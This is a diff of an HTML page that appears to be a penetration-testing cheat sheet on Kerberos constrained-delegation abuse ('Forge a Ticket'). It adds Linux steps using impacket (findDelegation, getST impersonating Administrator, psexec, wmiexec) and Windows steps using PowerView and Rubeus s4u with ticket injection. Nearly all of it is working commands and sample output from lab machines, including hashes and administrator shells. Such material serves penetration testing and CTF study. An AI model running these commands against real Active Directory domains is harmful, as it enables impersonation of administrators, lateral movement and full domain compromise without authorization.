@@ -326,13 +326,17 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="privesc-1-forge-a-ticket">Privesc #1: Forge a Ticket</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set1" data-tabcontent="tab1" >Linux</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-get-a-service-ticket">1. Get a service ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example, spn: www/dc.example.com <span class="o">(</span>Check Bloodhound<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -dc-ip &lt;DC_IP&gt; -spn &lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt; -hashes :&lt;HASH&gt; -impersonate Administrator &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-pre-check">1. Pre-Check</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
+</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC_IP&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
+</span></span><span class="line"><span class="cl"><span class="go">impacket-findDelegation &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC_IP&gt; -hashes :&lt;HASH&gt; -no-pass
+</span></span></span></code></pre></div><h4 id="2-get-a-service-ticket">2. Get a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getST -dc-ip &lt;DC_IP&gt; -spn &#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; -hashes :&lt;HASH&gt; -impersonate &#39;&lt;IMPERSONATE_USER&gt;&#39; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator <span class="s1">&#39;intelligence.htb/svc_int&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -342,10 +346,40 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2self
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting S4U2Proxy
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-</span></span></span></code></pre></div><h4 id="2-remote">2. Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;CCACHE_FILE&gt;
+</span></span></span></code></pre></div><h4 id="3-convert-ticket-optional">3. Convert Ticket [Optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 rubeustoccache.py &#39;&lt;BASE64_TICKET&gt;&#39; &#39;&lt;IMPERSONATE_USER&gt;.kirbi&#39; &#39;&lt;IMPERSONATE_USER&gt;.ccache&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 ~/Tools/RubeusToCcache/rubeustoccache.py &#39;doIG9DCCBv ...[SNIP]... 9yZS5jb20=&#39; &#39;administrator.kirbi&#39; &#39;administrator.ccache&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">╦═╗┬ ┬┌┐ ┌─┐┬ ┬┌─┐  ┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┬ ┬┌─┐
+</span></span></span><span class="line"><span class="cl"><span class="go">╠╦╝│ │├┴┐├┤ │ │└─┐   │ │ │  ║  │  ├─┤│  ├─┤├┤ 
+</span></span></span><span class="line"><span class="cl"><span class="go">╩╚═└─┘└─┘└─┘└─┘└─┘   ┴ └─┘  ╚═╝└─┘┴ ┴└─┘┴ ┴└─┘
+</span></span></span><span class="line"><span class="cl"><span class="go">              By Solomon Sklash
+</span></span></span><span class="line"><span class="cl"><span class="go">          github.com/SolomonSklash
+</span></span></span><span class="line"><span class="cl"><span class="go">   Inspired by Zer1t0&#39;s ticket_converter.py
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Writing decoded .kirbi file to administrator.kirbi
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Writing converted .ccache file to administrator.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] All done! Don&#39;t forget to set your environment variable: export KRB5CCNAME=administrator.ccache
+</span></span></span></code></pre></div><h4 id="4-remote">4. Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&#39;&lt;CCACHE_FILE&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; wmiexec.py -k -no-pass administrator@&lt;DC&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> psexec
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-psexec &#39;&lt;DOMAIN&gt;/&lt;IMPERSONATE_USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-psexec client.example.com/administrator@dc01.client.example.com -k -no-pass
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting shares on dc01.client.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Found writable share ADMIN$
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Uploading file MOjmtmkC.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Opening SVCManager on dc01.client.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Creating service NTdz on dc01.client.example.com.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Starting service NTdz.....
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">Microsoft Windows [Version 10.0.14393]
+</span></span></span><span class="line"><span class="cl"><span class="go">(c) 2016 Microsoft Corporation. All rights reserved.
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">C:\Windows\system32&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> wmiexec
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; wmiexec.py &#39;&lt;DOMAIN&gt;/&lt;IMPERSONATE_USER&gt;@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.intelligence.htb <span class="o">&amp;&amp;</span> wmiexec.py -k -no-pass administrator@dc.intelligence.htb
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -355,8 +389,75 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">C:\&gt;
 </span></span></span></code></pre></div><p><small><em>Note: impacket-wmiexec may not work</em></small></p></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-to-do">1. TO-DO</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">TO-DO
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-pre-check">1. Pre-Check</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import powerview
+</span></span><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check msds-allowedtodelegateto
+</span></span><span class="line"><span class="cl"><span class="go">Get-NetUser -TrustedToAuth
+</span></span></span></code></pre></div><p><button data-tabset="set1-2" data-tabcontent="tab1" class="active">Hash</button>
+<button data-tabset="set1-2" data-tabcontent="tab2" >Kerberos</button></p>
+<div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab1"><h4 id="2-calculate-hash">2. Calculate Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:&#39;&lt;PASSWORD&gt;&#39; /user:&#39;&lt;USER&gt;&#39; /domain:&lt;DOMAIN&gt;
+</span></span></span></code></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /aes256:&lt;HASH&gt; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;MS01$&#39; /rc4:7ddf32e17a6ac5ce04a8ecbf782ca509 /impersonateuser:administrator /msdsspn:&#34;cifs/dc01.client.example.com&#34; /nowrap /ptt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.3.2 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using rc4_hmac hash: 7ddf32e17a6ac5ce04a8ecbf782ca509
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building AS-REQ (w/ preauth) for: &#39;CLIENT.EXAMPLE.COM\MS01$&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: 172.16.1.2:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFljCCBZKg ...[SNIP]... hPUkUuQ09N
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: S4U
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building S4U2self request for: &#39;MS01$@CLIENT.EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2self request to 172.16.1.2:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2self success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got a TGS for &#39;administrator&#39; to &#39;MS01$@CLIENT.EXAMPLE.COM&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIGGjCCBh ...[SNIP]... cbBU1TMDIk
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Impersonating user &#39;administrator&#39; to target SPN &#39;cifs/dc01.client.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Building S4U2proxy request for service: &#39;cifs/dc01.client.example.com&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using domain controller: DC04.CLIENT.EXAMPLE.COM (172.16.1.2)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Sending S4U2proxy request to domain controller 172.16.1.2:88
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] S4U2proxy success!
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi) for SPN &#39;cifs/dc01.client.example.com&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIG9DCCBv ...[SNIP]... 9yZS5jb20=
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Ticket successfully imported!
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /aes256:&lt;HASH&gt; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1-2" data-tabcontent="tab2"><h4 id="2-request-a-tgt">2. Request a TGT</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe tgtdeleg /nowrap /ptt
+</span></span></span></code></pre></div><h4 id="3-get-a-service-ticket">3. Get a Service Ticket</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /ticket:&#39;&lt;BASE64_TICKET&gt;&#39; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Or Create a sacrificial process
+</span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe s4u /user:&#39;&lt;USER&gt;&#39; /ticket:&#39;&lt;BASE64_TICKET&gt;&#39; /impersonateuser:&#39;&lt;IMPERSONATE_USER&gt;&#39; /domain:&lt;DOMAIN&gt; /msdsspn:&#39;&lt;SERVICE&gt;/&lt;TARGET_DOMAIN&gt;&#39; /altservice:&lt;ALT_SERVICE&gt; /nowrap /ptt /createnetonly /program:C:\Windows\System32\cmd.exe
+</span></span></span></code></pre></div></div>
+<h4 id="4-remote">4. Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create session
+</span></span><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">session</span> <span class="o">=</span> new-pssession -computername &lt;COMPUTER_NAME&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Execute cmd
+</span></span><span class="line"><span class="cl"><span class="go">invoke-command $session { &lt;CMD&gt; }
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
